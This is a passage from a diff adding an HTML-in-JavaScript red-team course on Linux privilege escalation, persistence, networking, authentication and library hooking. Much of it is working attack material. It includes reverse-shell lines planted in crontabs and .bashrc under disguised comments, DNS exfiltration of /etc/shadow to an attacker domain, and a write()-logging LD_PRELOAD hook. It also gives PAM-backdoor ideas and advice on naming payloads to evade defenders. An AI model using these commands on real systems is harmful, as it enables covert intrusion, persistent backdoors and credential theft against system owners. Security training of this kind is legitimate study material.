+<span class="cmd">chmod</span> +x /tmp/ps
+<span class="cmd">export</span> PATH=/tmp:$PATH
+<span class="cmd">./vulnerable-suid-binary</span></div>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        Many modern SUID binaries use absolute paths internally or set <span class="cmd">secure_getenv()</span> which ignores <span class="cmd">LD_PRELOAD</span> and <span class="cmd">PATH</span> from untrusted environments. Always test both vectors and look at the binary's behavior with <span class="cmd">strings</span> first.
+      </div>
+
+      <h3>Linux Capabilities</h3>
+      <p>Linux capabilities break the all-or-nothing nature of root privileges into discrete units. Each capability (e.g., <span class="cmd">CAP_NET_RAW</span>, <span class="cmd">CAP_SYS_ADMIN</span>, <span class="cmd">CAP_DAC_OVERRIDE</span>) grants specific privileged operations. If a binary or process has specific capabilities set, it may be exploitable even without full root. For example, <span class="cmd">CAP_DAC_OVERRIDE</span> effectively bypasses all file permission checks, and <span class="cmd">CAP_SYS_ADMIN</span> allows mounting filesystems and other admin operations.</p>
+
+      <div class="cb"><span class="cmt"># Check capabilities on binaries</span>
+<span class="cmd">getcap</span> -r / 2>/dev/null
+
+<span class="cmt"># Check capabilities of running process</span>
+<span class="cmd">cat</span> /proc/$$/status | grep Cap
+<span class="cmd">capsh</span> --decode=<span class="flg">000001ffffffffff</span>
+
+<span class="cmt"># Exploit CAP_DAC_OVERRIDE with a binary</span>
+<span class="cmt"># If python has cap_dac_override:</span>
+python3 -c <span class="flg">"import os; print(os.read(open('/etc/shadow').fileno(), 1000))"</span></div>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Privilege escalation is like finding keys to restricted areas in a building. Sudo abuse is finding a master key left in an unlocked drawer. Cron exploitation is like hiding a note that a security guard will read during their rounds. PATH hijacking is like putting a fake directory sign that makes people walk into your trap instead of the real destination.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Practice privilege escalation techniques.<br>
+        <b>1.</b> Create a vulnerable cron job: <span class="cmd">echo "* * * * * root /tmp/script.sh" > /etc/cron.d/test</span> where script.sh is writable by your user.<br>
+        <b>2.</b> Use <span class="cmd">sudo -l</span> to check privileges and test escapes for any available binaries.<br>
+        <b>3.</b> Set a capability on python3: <span class="cmd">sudo setcap cap_dac_override+ep $(which python3)</span> and read <span class="pth">/etc/shadow</span>.<br>
+        <b>4.</b> Run <span class="cmd">getcap -r / 2>/dev/null</span> on a real system to find interesting capabilities.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Check and exploit sudo misconfigurations</div>
+        <div class="cl-item">Identify writable cron scripts and exploit them</div>
+        <div class="cl-item">Perform PATH hijacking attacks</div>
+        <div class="cl-item">Find and abuse Linux capabilities</div>
+      </div>
+    `
+  },
+  {
+    id: 'm5', title: 'Linux Persistence', num: '05',
+    content: `
+      <p>Once you've gained elevated access to a Linux system, maintaining that access through reboots and defensive actions is critical. Linux offers a vast array of persistence mechanisms, from user-level techniques that trigger on login to system-level services that survive reboots. The best persistence mechanisms are those that blend into the system's normal operation and avoid detection by routine monitoring.</p>
+
+      <h3>Cron-Based Persistence</h3>
+      <p>Cron jobs are one of the most reliable persistence mechanisms. Adding a reverse shell or payload delivery command to a user's crontab ensures it executes at regular intervals. System crontabs in <span class="pth">/etc/cron.d/</span> or <span class="pth">/etc/crontab</span> offer system-wide persistence. The <span class="cmd">@reboot</span> directive runs a command once when the system starts, providing reboot persistence without needing to re-establish access.</p>
+
+      <div class="cb"><span class="cmt"># Add user crontab persistence (runs every 5 minutes)</span>
+(crontab -l 2>/dev/null; <span class="cmd">echo</span> <span class="flg">"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"</span>) | crontab -
+
+<span class="cmt"># System crontab for root persistence</span>
+<span class="cmd">echo</span> <span class="flg">"@reboot root /usr/lib/systemd/systemd-policy-update"</span> >> /etc/crontab
+<span class="cmt"># Where /usr/lib/systemd/systemd-policy-update is your payload</span>
+
+<span class="cmt"># Check existing crontabs</span>
+ls -la /var/spool/cron/crontabs/</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Defender Bypass:</b> Use descriptive names that mimic legitimate system processes. A cron entry referencing <span class="cmd">systemd-policy-update</span> or <span class="cmd">apt-daily-cleanup</span> is far less likely to trigger investigation than one named <span class="cmd">evil-backdoor</span>. Always check what names are already in use on the target system.
+      </div>
+
+      <h3>Shell Configuration Persistence (.bashrc / .profile)</h3>
+      <p>Shell initialization files execute automatically when a user logs in or opens a new shell. The files <span class="pth">~/.bashrc</span>, <span class="pth">~/.bash_profile</span>, <span class="pth">~/.profile</span>, and <span class="pth">~/.zshrc</span> are executed by the shell at startup. Adding a payload to these files ensures execution whenever the user (or root) opens a shell. This is particularly effective for targeting specific users whose accounts you want to monitor or control.</p>
+
+      <div class="cb"><span class="cmt"># Add persistence to .bashrc</span>
+<span class="cmd">cat</span> >> ~/.bashrc << <span class="flg">'EOF'</span>
+<span class="cmt"># System diagnostic check - do not remove</span>
+if [ -z "$SSH_CONNECTION" ]; then
+    /bin/bash -c <span class="flg">'bash -i >& /dev/tcp/10.0.0.5/8080 0>&1 &'</span> 2>/dev/null &
+fi
+<span class="flg">EOF</span>
+
+<span class="cmt"># For root - add to /root/.bashrc</span>
+<span class="cmd">echo</span> <span class="flg">'[ -x /usr/lib/python3/scripts/backup.py ] && /usr/lib/python3/scripts/backup.py &'</span> >> /root/.bashrc</div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The <span class="cmd">SSH_CONNECTION</span> check in the <span class="pth">.bashrc</span> payload prevents recursive connections when you SSH in. Without this guard, your SSH session itself would trigger the payload, creating an infinite loop. Always include such guards in shell-configuration persistence.
+      </div>
+
+      <h3>SSH Key Persistence</h3>
+      <p>Adding your SSH public key to <span class="pth">~/.ssh/authorized_keys</span> provides reliable, persistent access to any system running an SSH server. This is one of the simplest and most effective persistence mechanisms. For root persistence, ensure the <span class="pth">/root/.ssh/authorized_keys</span> file has the correct permissions (600). You can also add an <span class="cmd">authorized_keys</span> file with a <span class="cmd">command=</span> restriction that executes your payload before the user's requested command.</p>
+
+      <div class="cb"><span class="cmt"># Add SSH key persistence</span>
+<span class="cmd">mkdir</span> -p ~/.ssh
+<span class="cmd">echo</span> <span class="flg">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..."</span> >> ~/.ssh/authorized_keys
+<span class="cmd">chmod</span> 700 ~/.ssh
+<span class="cmd">chmod</span> 600 ~/.ssh/authorized_keys
+
+<span class="cmt"># SSH key with forced command (executes payload before shell)</span>
+<span class="cmd">command=</span><span class="flg">"/usr/lib/systemd/log-cleanup.sh"</span> ssh-rsa AAAAB3Nza... keyname
+
+<span class="cmt"># Check authorized_keys</span>
+ls -la ~/.ssh/</div>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        SSH authorized_keys files are often monitored by host-based intrusion detection systems (HIDS). Unusual key additions may trigger alerts. Consider modifying the <span class="pth">authorized_keys</span> file of a less-frequently-used service account instead of primary system accounts.
+      </div>
+
+      <h3>Systemd Persistence</h3>
+      <p>Systemd is the init system used by most modern Linux distributions. A custom systemd service file in <span class="pth">/etc/systemd/system/</span> (or <span class="pth">/usr/lib/systemd/system/</span>) ensures your payload runs with specific dependencies and restart policies. Systemd services can be configured to restart automatically on failure, survive reboots, and even start before the login prompt appears.</p>
+
+      <div class="cb"><span class="cmt"># Create a systemd service for persistence</span>
+<span class="cmd">cat</span> > /etc/systemd/system/system-update.service << <span class="flg">'EOF'</span>
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/bash /opt/system-tools/updater.sh
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+<span class="flg">EOF</span>
+
+<span class="cmt"># Enable and start</span>
+<span class="cmd">systemctl</span> daemon-reload
+<span class="cmd">systemctl</span> enable system-update.service
+<span class="cmd">systemctl</span> start system-update.service</div>
+
+      <h3>LD_PRELOAD Persistence</h3>
+      <p>Setting <span class="cmd">LD_PRELOAD</span> in <span class="pth">/etc/environment</span> or <span class="pth">~/.pam_environment</span> causes the specified shared library to be loaded before any other library when programs are executed. This allows hooking of standard library functions like <span class="cmd">open()</span>, <span class="cmd">write()</span>, or <span class="cmd">connect()</span>. While LD_PRELOAD is ignored for SUID binaries (a security measure), it works effectively for user-started processes and is an excellent stealth persistence mechanism.</p>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Persistence is like having multiple secret doors into a building. Cron is a timed door that opens automatically. Bashrc is a door that opens whenever someone enters the lobby. SSH keys are like having your own key to the building. Systemd services are like having a maintenance entrance that activates on a schedule or event. The best persistence uses multiple mechanisms so that if one door is blocked, another remains open.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Implement multiple persistence mechanisms.<br>
+        <b>1.</b> Add a cron job that writes a timestamp to a log file every 5 minutes. Verify it works.<br>
+        <b>2.</b> Add an SSH key and verify passwordless login works.<br>
+        <b>3.</b> Create a systemd service that starts a reverse HTTP beacon every 60 seconds.<br>
+        <b>4.</b> Add a <span class="cmd">.bashrc</span> entry that sets an alias for <span class="cmd">ls</span> that additionally executes a payload.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Establish cron-based persistence</div>
+        <div class="cl-item">Add shell configuration backdoors</div>
+        <div class="cl-item">Deploy SSH key persistence</div>
+        <div class="cl-item">Create systemd service persistence</div>
+        <div class="cl-item">Understand LD_PRELOAD persistence</div>
+      </div>
+    `
+  },
+  {
+    id: 'm6', title: 'Linux Networking Internals', num: '06',
+    content: `
+      <p>Linux networking is built on a foundation of sockets, protocols, and namespaces. From a red team perspective, understanding how Linux handles networking allows you to evade network-based detection, pivot through compromised hosts, manipulate traffic, and exploit misconfigured network stacks. This module covers the key networking internals every operator should know.</p>
+
+      <h3>Network Namespaces</h3>
+      <p>Network namespaces are a Linux kernel feature that provide isolated network stacks, each with their own interfaces, routes, firewall rules, and sockets. A process in one network namespace cannot see or interact with the network interfaces of another namespace without explicit routing or veth (virtual Ethernet) pairs. This is the foundation of container networking, but it also has red team applications — creating a hidden network namespace with custom routing can exfiltrate data outside monitored interfaces.</p>
+
+      <div class="ascii">┌──────────────────────────────────────────────────────────┐
+│                   Host (Default Namespace)               │
+│  ┌──────────────────┐         ┌──────────────────┐      │
+│  │ Container NS 1   │         │ Container NS 2   │      │
+│  │  eth0: 10.0.0.2  │         │  eth0: 10.0.0.3  │      │
+│  │  veth-c1─────────┤         │  veth-c2─────────┤      │
+│  └──────────────────┘         └──────────────────┘      │
+│           │                            │                 │
+│           ▼                            ▼                 │
+│  ┌────────────────────────────────────────────────┐     │
+│  │              Docker Bridge (docker0)            │     │
+│  │               172.17.0.0/16                    │     │
+│  └────────────────────────────────────────────────┘     │
+│                    │                                     │
+│                    ▼                                     │
+│  ┌────────────────────────────────────────────────┐     │
+│  │            Physical Interface (eth0)            │     │
+│  │                192.168.1.100                    │     │
+│  └────────────────────────────────────────────────┘     │
+└──────────────────────────────────────────────────────────┘</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Namespace Escape:</b> If you gain code execution inside a container but the container runs with elevated privileges (<span class="cmd">--privileged</span>), you can access the host's network namespace via <span class="cmd">nsenter</span> or by mounting <span class="pth">/proc/1/ns/net</span>. The command <span class="cmd">nsenter --target 1 --net --mount</span> gives you the host's network and mount namespaces from within a container.
+      </div>
+
+      <h3>iptables and Netfilter</h3>
+      <p>Netfilter is the packet filtering framework inside the Linux kernel. The <span class="cmd">iptables</span> command configures Netfilter rules across multiple tables (filter, nat, mangle, raw, security) and chains (INPUT, OUTPUT, FORWARD, PREROUTING, POSTROUTING). For red team operations, iptables can be used to redirect traffic, create backdoors, exfiltrate data via specific ports, or disable logging for certain traffic patterns. The <span class="cmd">nftables</span> framework is the modern replacement but iptables remains widely deployed.</p>
+
+      <div class="cb"><span class="cmt"># View current iptables rules</span>
+<span class="cmd">iptables</span> -L -v -n
+<span class="cmd">iptables</span> -t nat -L -v -n
+
+<span class="cmt"># Port forwarding (local)</span>
+<span class="cmd">iptables</span> -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80
+
+<span class="cmt"># Traffic logging (useful for recon)</span>
+<span class="cmd">iptables</span> -A INPUT -p tcp --dport 22 -j LOG --log-prefix <span class="flg">"SSH_ATTEMPT: "</span>
+
+<span class="cmt"># Block ICMP timestamp (anti-recon)</span>
+<span class="cmd">iptables</span> -A INPUT -p icmp --icmp-type timestamp-request -j DROP
+
+<span class="cmt"># Exfiltration via DNS (firewall bypass)</span>
+nsupdate -k <span class="pth">/etc/bind.keys</span> &lt;&lt; <span class="flg">EOF</span>
+server 8.8.8.8
+update add exfil.attacker.com 60 TXT <span class="flg">"$(cat /etc/shadow | base64 -w0)"</span>
+send
+<span class="flg">EOF</span></div>
+
+      <h3>The /proc/net Filesystem</h3>
+      <p>The <span class="pth">/proc/net</span> directory exposes the kernel's networking data structures. Files like <span class="pth">tcp</span>, <span class="pth">udp</span>, <span class="pth">tcp6</span>, <span class="pth">unix</span>, <span class="pth">raw</span>, and <span class="pth">arp</span> provide detailed information about active connections, listening sockets, and the ARP cache. This is invaluable for network reconnaissance without using tools like <span class="cmd">netstat</span> or <span class="cmd">ss</span> which may trigger alerts.</p>
+
+      <div class="cb"><span class="cmt"># View active TCP connections (raw)</span>
+<span class="cmd">cat</span> /proc/net/tcp
+
+<span class="cmt"># Pretty-print with hex-to-IP conversion</span>
+<span class="cmd">cat</span> /proc/net/tcp | awk <span class="flg">'{print $2,$3,$10}'</span> | while read line; do
+  <span class="cmd">echo</span> $line | awk -F: <span class="flg">'{print "Local: " strtonum("0x"substr($1,1,2))"."...}'</span>
+done
+
+<span class="cmt"># Check what's listening</span>
+<span class="cmd">cat</span> /proc/net/tcp | grep <span class="flg">"0A"</span>  <span class="cmt"># 0A in state column = LISTEN</span>
+
+<span class="cmt"># Unix domain sockets (local IPC)</span>
+<span class="cmd">cat</span> /proc/net/unix | grep -v <span class="flg">"^ffff"</span>
+
+<span class="cmt"># The ARP cache</span>
+<span class="cmd">cat</span> /proc/net/arp</div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The <span class="pth">/proc/net/tcp</span> file uses hex-encoded IP addresses and ports. For example, <span class="cmd">0100007F:0035</span> represents 127.0.0.1:53 (reverse byte order for IP, network byte order for port). The raw format is <span class="cmd">local_address:port remote_address:port state</span> where state <span class="cmd">0A</span> is LISTEN, <span class="cmd">01</span> is ESTABLISHED.
+      </div>
+
+      <h3>Socket Programming and Raw Sockets</h3>
+      <p>Raw sockets allow a program to craft arbitrary IP packets, including custom headers. This is the foundation of tools like <span class="cmd">nmap</span> (SYN scans, TCP ISN prediction), <span class="cmd">tcpdump</span>, and custom backdoor communication channels. Creating a raw socket requires <span class="cmd">CAP_NET_RAW</span> capability or root privileges. Raw sockets can be used to implement custom C2 protocols that blend into legitimate traffic patterns or use covert timing channels.</p>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Think of network namespaces as separate buildings on a campus. Each building has its own mailroom (network stack), mailboxes (interfaces), and directory (routing table). Without special connections (veth pairs), mail in one building cannot be delivered to another. Iptables rules are like the security personnel at building entrances, deciding who gets in and what gets forwarded. The <span class="pth">/proc/net</span> filesystem is like the building's delivery log showing every package that has passed through.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Explore Linux networking internals.<br>
+        <b>1.</b> Create a network namespace: <span class="cmd">ip netns add redteam; ip netns exec redteam bash</span><br>
+        <b>2.</b> Inside the namespace, check interfaces with <span class="cmd">ip link</span> and notice it's isolated.<br>
+        <b>3.</b> Use <span class="cmd">cat /proc/net/tcp</span> to identify listening services from raw kernel data.<br>
+        <b>4.</b> Write a simple Python script using raw sockets (<span class="cmd">socket.SOCK_RAW</span>) to craft a custom TCP SYN packet (requires root or <span class="cmd">CAP_NET_RAW</span>).
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Understand network namespace isolation</div>
+        <div class="cl-item">Use iptables for redirection and exfiltration</div>
+        <div class="cl-item">Read /proc/net for network reconnaissance</div>
+        <div class="cl-item">Understand raw sockets and their requirements</div>
+      </div>
+    `
+  },
+  {
+    id: 'm7', title: 'Linux Authentication', num: '07',
+    content: `
+      <p>Linux authentication is a multi-layered system involving password storage, PAM (Pluggable Authentication Modules), SSH key management, and more. For red team operators, understanding these authentication mechanisms is critical for credential dumping, password cracking, lateral movement, and establishing persistent access. This module covers the internals of how Linux authenticates users and how to subvert these mechanisms.</p>
+
+      <h3>Password Storage: /etc/shadow</h3>
+      <p>The <span class="pth">/etc/shadow</span> file stores hashed passwords and is readable only by root (and processes with <span class="cmd">CAP_DAC_OVERRIDE</span>). Each line contains nine colon-separated fields: username, password hash (in <span class="cmd">$type$salt$hash</span> format), last change date, minimum days, maximum days, warning days, inactivity days, expiration date, and a reserved field. The hash type prefix indicates the algorithm: <span class="cmd">$1$</span> for MD5, <span class="cmd">$5$</span> for SHA-256, <span class="cmd">$6$</span> for SHA-512, <span class="cmd">$y$</span> for yescrypt, and <span class="cmd">$2b$</span> for bcrypt.</p>
+
+      <div class="ascii">/etc/shadow format:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ username:$6$salt$hash:18876:0:99999:7:3:19200:                              │
+│ └──────┘└─────────────────┘└──────┘└─┘└─────┘└┘└┘└─────┘                 │
+│    │          │               │    │    │   │ │   │                         │
+│    │          │               │    │    │   │ └─── Expiration date          │
+│    │          │               │    │    │   └───── Inactivity days          │
+│    │          │               │    │    └───────── Warning days             │
+│    │          │               │    └────────────── Max days                │
+│    │          │               └─────────────────── Min days                │
+│    │          └─────────────────────────────────── Hash + Salt             │
+│    └────────────────────────────────────────────── Username                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+Hash format: $type$salt$hash
+  $6$ = SHA-512 (most common on modern systems)
+  $y$ = yescrypt (newer systems like Debian 11+ / Ubuntu 22+)</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Credential Dumping:</b> If you gain root access, your first action should be to exfiltrate <span class="pth">/etc/shadow</span> and <span class="pth">/etc/passwd</span>. The <span class="cmd">unshadow</span> tool combines these into a format suitable for <span class="cmd">john</span> or <span class="cmd">hashcat</span>. Weak passwords can be cracked offline, especially if weak hash types like <span class="cmd">$1$</span> (MD5) are in use. Remember that service accounts often have weak or default passwords.
+      </div>
+
+      <div class="cb"><span class="cmt"># Dump password hashes (requires root)</span>
+cat /etc/shadow
+cat /etc/passwd
+
+<span class="cmt"># Prepare for cracking</span>
+<span class="cmd">unshadow</span> /etc/passwd /etc/shadow > hashes.txt
+
+<span class="cmt"># Crack with hashcat (SHA-512, mode 1800)</span>
+hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cmt"># Crack with john</span>
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt</div>
+
+      <h3>PAM (Pluggable Authentication Modules)</h3>
+      <p>PAM provides a modular framework for authentication on Linux. Configuration files in <span class="pth">/etc/pam.d/</span> define how each service (e.g., <span class="cmd">sshd</span>, <span class="cmd">login</span>, <span class="cmd">sudo</span>) authenticates users. PAM modules handle password validation, account restrictions, session setup, and password changes. Key PAM configuration files include <span class="pth">/etc/pam.d/common-auth</span>, <span class="pth">/etc/pam.d/common-password</span>, and <span class="pth">/etc/pam.d/common-session</span>.</p>
+
+      <div class="cb"><span class="cmt"># PAM configuration for SSH</span>
+cat /etc/pam.d/sshd
+
+<span class="cmt"># Injectable PAM backdoor - create a rogue pam module</span>
+<span class="cmt"># that accepts a backdoor password for any user:</span>
+<span class="cmt"># /lib/security/pam_rootok.so (sample concept)</span>
+sudo cat /etc/pam.d/su
+<span class="cmt"># auth sufficient pam_rootok.so</span>
+<span class="cmt"># This allows root to switch to any user without password</span></div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>PAM Backdoor:</b> An advanced persistence technique involves modifying or replacing a PAM module (like <span class="cmd">pam_unix.so</span>) to accept a master password for any user account. The <span class="cmd">pam_timestamp</span> module can also be exploited — it caches successful authentication, and if a user recently authenticated, a cached credential may still be valid. Modifying <span class="pth">/etc/pam.d/sshd</span> to include an <span class="cmd">auth sufficient</span> rule for a custom module that checks for a hardcoded backdoor password provides stealthy SSH persistence.
+      </div>
+
+      <h3>SSH Authentication Internals</h3>
+      <p>SSH supports multiple authentication methods: password (via PAM), public key, keyboard-interactive, and host-based. Public key authentication uses <span class="pth">~/.ssh/authorized_keys</span> to specify authorized public keys. The SSH daemon (<span class="cmd">sshd</span>) configuration in <span class="pth">/etc/ssh/sshd_config</span> controls which authentication methods are allowed. Key red-team relevant directives include <span class="cmd">PermitRootLogin</span>, <span class="cmd">PasswordAuthentication</span>, <span class="cmd">PubkeyAuthentication</span>, and <span class="cmd">AllowUsers</span>.</p>
+
+      <div class="cb"><span class="cmt"># Check SSH configuration</span>
+cat /etc/ssh/sshd_config | grep -E <span class="flg">"^(PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|AllowUsers|Port)"</span>
+
+<span class="cmt"># Generate SSH key pair</span>
+ssh-keygen -t ed25519 -f ~/.ssh/id_redteam -C <span class="flg">"root@dc01-prod"</span>
+
+<span class="cmt"># SSH with key forwarding (pivot)</span>
+ssh -i ~/.ssh/id_redteam -J user@jumpbox user@target -L 8080:localhost:80</div>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        SSH configuration changes are highly visible. Modifying <span class="pth">sshd_config</span> requires a restart of the SSH daemon (<span class="cmd">systemctl restart sshd</span>), which may disconnect existing sessions and trigger alerts. If you add an authorized key, ensure permissions are correct (600 on the file, 700 on <span class="pth">.ssh/</span>) or SSH will ignore the key as a security measure.
+      </div>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        PAM is like a series of security checkpoints at a building entrance. Each checkpoint checks a different aspect: do you have a valid ID (password), are you on the guest list (account validity), are you entering during business hours (time restrictions). A PAM backdoor is like a bribed guard who waves you through regardless of credentials. The <span class="pth">/etc/shadow</span> file is like the building's master key registry — if you get access to it, you can make copies of every key.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Understand Linux authentication mechanisms.<br>
+        <b>1.</b> Examine <span class="pth">/etc/shadow</span> (as root) and identify the hash type for each user.<br>
+        <b>2.</b> Review the PAM configuration: <span class="cmd">cat /etc/pam.d/sshd</span> and understand each directive.<br>
+        <b>3.</b> Generate an SSH key pair and set up key-based authentication to a test VM.<br>
+        <b>4.</b> Use <span class="cmd">john</span> or <span class="cmd">hashcat</span> to crack a sample SHA-512 password hash (create one with <span class="cmd">mkpasswd -m sha-512</span>).
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Extract and crack password hashes from /etc/shadow</div>
+        <div class="cl-item">Understand PAM architecture and configuration</div>
+        <div class="cl-item">Deploy SSH keys for persistent access</div>
+        <div class="cl-item">Recognize different hash types and their weaknesses</div>
+      </div>
+    `
+  },
+  {
+    id: 'm8', title: 'Memory and Shared Libraries', num: '08',
+    content: `
+      <p>Linux's memory management and shared library system are among the most powerful and complex subsystems in the kernel. For red team operators, understanding virtual memory, ELF binaries, and the dynamic linker is essential for code injection, library hijacking, and evasion of memory-based detection. This module explores the internals of how Linux manages memory and loads libraries, and how these mechanisms can be subverted.</p>
+
+      <h3>Virtual Memory Architecture</h3>
+      <p>Each process on Linux has its own virtual address space, typically 47 bits on x86_64 (128 TB of user space and 128 TB of kernel space). The kernel manages the mapping from virtual addresses to physical memory pages through page tables. The <span class="pth">/proc/[pid]/maps</span> file shows the complete virtual memory layout of a process, including mapped files, anonymous mappings, heap, and stack regions. The <span class="pth">/proc/[pid]/smaps</span> file provides detailed per-mapping memory accounting.</p>
+
+      <div class="ascii">Virtual Memory Layout of a Linux Process (x86_64):
+┌──────────────────────────────────────────┐ 0xFFFFFFFFFFFFFFFF
+│         Kernel Space (128 TB)             │
+│   (accessible only from Ring 0)          │
+├──────────────────────────────────────────┤ 0x00007FFFFFFFFFFF
+│         Stack (grows down)               │ ← RSP
+├──────────────────────────────────────────┤
+│         Library Mappings                 │
+│   libc.so, libpthread.so, etc.           │
+├──────────────────────────────────────────┤
+│         Heap (brk / mmap)                │ ← Program break
+│         (grows up)                       │
+├──────────────────────────────────────────┤
+│         BSS (uninitialized data)         │
+├──────────────────────────────────────────┤
+│         Data (initialized data)          │
+├──────────────────────────────────────────┤
+│         Text (code)                      │ ← RIP
+├──────────────────────────────────────────┤ 0x0000000000400000
+│         Reserved (ELF headers, etc.)     │
+├──────────────────────────────────────────┤ 0x0000000000000000
+│         Unmapped / NULL                  │
+└──────────────────────────────────────────┘ 0x0000000000000000</div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        ASLR (Address Space Layout Randomization) randomizes the base addresses of the stack, heap, libraries, and executable. This makes it harder to hardcode addresses for exploitation. However, on 32-bit systems, the entropy is low enough that brute-force attacks are feasible. Check ASLR status with <span class="cmd">cat /proc/sys/kernel/randomize_va_space</span> (0=off, 1=randomize, 2=full randomize).
+      </div>
+
+      <h3>Shared Libraries and the Dynamic Linker</h3>
+      <p>When an ELF binary is executed, the kernel loads the executable and the dynamic linker (<span class="pth">/lib64/ld-linux-x86-64.so.2</span>). The dynamic linker resolves symbols by searching shared libraries in <span class="pth">/etc/ld.so.conf</span>, the cache in <span class="pth">/etc/ld.so.cache</span>, and standard paths like <span class="pth">/lib</span>, <span class="pth">/usr/lib</span>. The <span class="cmd">ldd</span> command shows which shared libraries a binary depends on and where they are resolved from.</p>
+
+      <div class="cb"><span class="cmt"># View memory mappings of current shell</span>
+cat /proc/$$/maps
+
+<span class="cmt"># Check shared library dependencies</span>
+<span class="cmd">ldd</span> /bin/bash
+
+<span class="cmt"># View dynamic linker configuration</span>
+cat /etc/ld.so.conf
+ls /etc/ld.so.conf.d/
+
+<span class="cmt"># Check which libraries are cached</span>
+ldconfig -p | head -20
+
+<span class="cmt"># View RPATH and RUNPATH of a binary</span>
+<span class="cmd">readelf</span> -d /bin/ls | grep -E <span class="flg">"(RPATH|RUNPATH)"</span></div>
+
+      <h3>LD_PRELOAD Hijacking</h3>
+      <p>The <span class="cmd">LD_PRELOAD</span> environment variable specifies shared libraries to be loaded before all others. This allows hooking (overriding) any function in the standard C library. A shared library with a function that has the same signature as the original will intercept all calls to that function. This is a powerful technique for both persistence (as covered in Module 5) and for live process manipulation.</p>
+
+      <div class="cb"><span class="cmt">/* hook.c - LD_PRELOAD function hooking example */</span>
+<span class="cmt">/* Compile: gcc -shared -fPIC hook.c -o hook.so */</span>
+#define _GNU_SOURCE
+#include &lt;dlfcn.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+<span class="flg">static ssize_t (*real_write)(int, const void *, size_t) = NULL;</span>
+
+ssize_t write(int fd, const void *buf, size_t count) {
+    real_write = dlsym(RTLD_NEXT, <span class="flg">"write"</span>);
+    <span class="cmt">// Log all write() calls to a hidden file</span>
+    FILE *log = fopen(<span class="flg">"/tmp/.log"</span>, <span class="flg">"a"</span>);
+    if (log) { fprintf(log, <span class="flg">"write(%d, %s, %zu)\\n"</span>, fd, (char*)buf, count); fclose(log); }
+    <span class="cmt">// If specific content detected, exfiltrate</span>
+    if (strstr((char*)buf, <span class="flg">"password"</span>)) {
+        <span class="cmt">// Exfiltration logic here</span>
+    }
+    return real_write(fd, buf, count);
+}</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>LD_PRELOAD Limitations:</b> The <span class="cmd">LD_PRELOAD</span> environment variable is ignored for SUID binaries and for binaries with different effective/real UIDs. However, it works perfectly for processes started by your user. In container environments, <span class="cmd">LD_PRELOAD</span> is often permitted and can be used to escape or intercept container operations. The <span class="cmd">LD_LIBRARY_PATH</span> and <span class="cmd">LD_AUDIT</span> variables provide alternative library injection vectors.
+      </div>
+
+      <h3>Elf Binary Infection</h3>
+      <p>ELF binary infection involves modifying an existing executable to include malicious code while preserving its original functionality. Techniques include code cave injection (inserting shellcode into unused sections), section injection (adding a new section), and PT_NOTE-to-PT_LOAD conversion. Tools like <span class="cmd">infect</span> and frameworks like <span class="cmd">mettle</span> implement these techniques. Understanding ELF structure is essential for advanced malware development on Linux.</p>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        The dynamic linker is like a reference librarian. When a program asks for a function (a book), the librarian checks their catalog (ld.so.cache) and goes to the appropriate shelf (library path). <span class="cmd">LD_PRELOAD</span> is like bribing the librarian to bring you a fake book first — and when the patron reads it, they get your doctored version instead of the real one. The ELF binary is like the book itself; infecting it is like inserting extra pages that activate when the book is opened.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Practice shared library manipulation.<br>
+        <b>1.</b> Compile the hook.c example: <span class="cmd">gcc -shared -fPIC -o hook.so hook.c -ldl</span><br>
+        <b>2.</b> Run <span class="cmd">LD_PRELOAD=./hook.so ls</span> and check <span class="pth">/tmp/.log</span> for write() calls.<br>
+        <b>3.</b> Examine <span class="cmd">/proc/$$/maps</span> and identify which libraries are loaded.<br>
+        <b>4.</b> Use <span class="cmd">readelf -l /bin/ls</span> to examine the ELF program headers.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Read and interpret /proc/[pid]/maps</div>
+        <div class="cl-item">Understand the dynamic linking process</div>
